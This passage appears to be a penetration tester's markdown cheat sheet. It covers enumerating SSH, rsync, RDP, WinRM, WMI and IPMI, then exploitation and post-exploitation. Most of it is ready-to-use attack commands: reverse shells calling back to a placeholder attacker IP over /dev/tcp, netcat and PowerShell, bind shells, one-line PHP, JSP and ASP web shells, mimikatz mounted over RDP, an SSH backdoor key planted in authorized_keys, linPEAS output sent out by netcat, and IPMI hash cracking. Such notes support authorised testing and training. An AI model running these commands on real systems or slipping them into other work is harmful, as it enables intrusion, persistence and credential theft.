use auxiliary/scanner/ipmi/ipmi_dumphashes
run

### Crack HP iLO format
# https://hashcat.net/wiki/doku.php?id=example_hashes
hashcat -m 7300 ipmi_hash.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
hashcat -m 7300 -w 3 -O "<HASH>" /usr/share/wordlists/rockyou.txt
```

## Nix: SSH

- `TCP 22`: normal
- Server Config:
    - `/etc/ssh/sshd_config`
    - https://www.ssh.com/academy/ssh/sshd_config
- Versions:
    - v1: obselete and vuln to MITM
    - v2: modern

{{% details "Dangerous Settings" %}}
- https://www.ssh-audit.com/hardening_guides.html

| **Setting**                  | **Description**                             |
| ---------------------------- | ------------------------------------------- |
| `PasswordAuthentication yes` | Allows password-based authentication.       |
| `PermitEmptyPasswords yes`   | Allows the use of empty passwords.          |
| `PermitRootLogin yes`        | Allows to log in as the root user.          |
| `Protocol 1`                 | Uses an outdated version of encryption.     |
| `X11Forwarding yes`          | Allows X11 forwarding for GUI applications. |
| `AllowTcpForwarding yes`     | Allows forwarding of TCP ports.             |
| `PermitTunnel`               | Allows tunneling.                           |
| `DebianBanner yes`           | Displays a specific banner when logging in. |
{{% /details %}}

```bash
# Audit sercurity of SSH server
# https://github.com/jtesta/ssh-audit
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py -l warn <TARGET> | tee ssh_audit.txt

# Specify auth-method: password
ssh -v -o PreferredAuthentications=password <USER>@<TARGET>
sshpass -p '<PASSWORD>' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 <USER>@<TARGET>

# Force auth-method: privkey
ssh -i <PRIVATE_KEY> <USER>@<TARGET>
```

## Nix: Rsync

- `TCP 873`: normal
- Pentesting: https://archive.ph/flPtZ
- Rsync via `ssh`: https://phoenixnap.com/kb/how-to-rsync-over-ssh

```bash
# Enum via nmap
sudo nmap -sV -p873 <TARGET>

# Enum dir
rsync -av --list-only rsync://<TARGET>/<DIR>

# Download dir optionally via SSH
rsync -av -e "ssh -p <SSH_PORT>" rsync://<TARGET>/<DIR>
```

## Nix: R-services

- `TCP 512/513/514`: `rexecd`, `rlogind`, `rshd`
- `UDP 513`: `rwhod`
- https://en.wikipedia.org/wiki/Berkeley_r-commands
- Server Config
    - `/etc/hosts.equiv`: allowed hosts for `rlogin`
    - `~/{.rlogin, .rhosts}`: allowed hosts

Suite of obsolete remote management tools. All communication is unencrypted including its authentication.

```bash
# Enum via nmap
sudo nmap -sV -p 512,513,514 <TARGET>

# Remote copy; does not confirm remote overwriting of files
rcp
# Remote shell
rsh
# Remote command
rexec
# Remote login (telnet-like)
rlogin <TARGET> -l <USER>
# Show authenticated users
rwho
rusers -al <TARGET>
```

## Win: RDP

- `TCP 3389`: normal
- `UDP 3389`: automatic w/ RDP 8.0+ for performance (frames, audio, etc.)

Also called "Terminal Services".

```bash
# Enum via nmap
sudo nmap -sV -sC --script rdp* -p3389 <TARGET>

# Enum RDP security posture
sudp cpan
sudo cpan Encoding::BER
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl <TARGET>

# Connects to RDP and mounts mimikatz share
xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share

\\tsclient\share\mimikatz.exe
```

## Win: WinRM

- `TCP 5985/5986`: via HTTP/HTTPS respectively

```bash
# Enum via nmap
sudo nmap --disable-arp-ping -n -sV -sC -p5985,5986 <TARGET>

# Connect via WinRM
evil-winrm -u <USER> -p <PASSWORD> -i <HOST>
evil-winrm -u <USER> -H <PASS_HASH> -i <HOST>
```

## Win: WMI

- `TCP 135`: first, initialization
- `TCP <RHP>`: afterwards, comms

```bash
# Run interactive shell
impacket-wmiexec <USER>:"<PASSWORD>"@<TARGET>
# Run remote command
impacket-wmiexec <USER>:"<PASSWORD>"@<TARGET> "<COMMAND>"
```

# Exploitation

- Exploit DBs
    - https://www.exploit-db.com/
    - https://www.rapid7.com/db/
    - https://www.vulnerability-lab.com/

## Reverse Shells

- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- URL ENCODE: https://www.urlencoder.org/

```bash
# === ATTACKER: LISTENER ===
nc -lvnp <CALLBACK_PORT>

# === TARGET: CALLBACKS ===
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<CALLBACK_PORT> 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <CALLBACK_PORT> >/tmp/f

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<CALLBACK_PORT>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## Bind Shells

- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/

```bash
# === TARGET: LISTENER ===
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <LISTEN_PORT> >/tmp/f

python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<LISTEN_PORT>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<LISTEN_PORT>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

# === ATTACKER: CONNECT ===
nc <TARGET> <LISTEN_PORT>
```

```shell
# === SHELL UPGRADE ===
for i in python3 python python2; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit; done
script /dev/null -c /bin/bash

export TERM=xterm-256color

CTRL+Z
stty raw -echo ; fg

echo "MAKE SURE THIS IS RAN ON ATTACKER BOX, THEN...\n\nON TARGET SHELL:\nstty rows $(tput lines) columns $(tput cols)"
```

## Web Shells

- `/usr/share/webshells`
- Beachhead: https://github.com/flozz/p0wny-shell
- Post-Exploit: https://github.com/wso-shell-php/.github
- https://github.com/payloadbox/command-injection-payload-list

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

### Command executor

```php
echo '<?php if(isset($_GET["debug"])) system($_GET["debug"]); ?>' > debug.php

curl -skL -o- http://<TARGET>/debug.php?debug=<COMMAND>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

## File Transfer

- https://cheatography.com/fred/cheat-sheets/file-transfers/

```bash
# === HTTP ===
sudo python3 -m http.server 80

# === HTTPS Server ===
openssl req -new -x509 -keyout https_server_cert.pem -out https_server_cert.pem -days 365 -nodes

sudo python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='https_server_cert.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

# Post-Exploitation

## Backdoor Access

```bash
# Attacker
ssh-keygen -f ./target_backdoor_key -N "" -C "service@localhost" && echo "\n\necho '$(cat ./target_backdoor_key.pub)' >> ~/.ssh/authorized_keys\n\n"

# Target: !!! RUN COMMAND ABOVE !!!

# Attacker
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./target_backdoor_key <USER>@<TARGET>
```

## Privilege Escalation (PrivEsc)

**NOTE:** scripts are noisy for any sort of monitoring software, so manual checks may be preferred

### Linux

- https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md
- https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/
- https://gtfobins.github.io/

#### linPEAS

```bash
# === ATTACKER ===
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
ip a ; python3 -m http.server 8000

# === TARGET ===
cd /tmp
wget http://<IP_ADDR>:8000/linpeas.sh
chmod +x linpeas.sh
REGEXES="0" ./linpeas.sh 2>&1 | tee linpeas_output.txt

# === KALI ===
scp <USER>@<TARGET>:/tmp/linpeas_output.txt ~/
# NC
nc -l -p <PORT> > ~/linpeas_output.txt
cat /tmp/linpeas_output.txt | nc <ATTACKER_IP> <PORT>
# wait a moment, then CTRL+C
```

```bash
dpkg -l

sudo -l

cat /etc/crontab /var/spool/cron/crontabs/root
ls -la /etc/cron.d/

ls -la /home/*/.ssh/
ls -la /root/.ssh/
```

### Windows

- https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- https://github.com/GhostPack/Seatbelt
- https://lolbas-project.github.io/#

```bash
for %f in ("C:\Program Files", "C:\Program Files (x86)") do @(echo. && echo --- Listing: %~f --- && dir "%~f" /b)
```

# Lateral Movement

# Proof-of-Concept/Reporting

# Post-Engagement

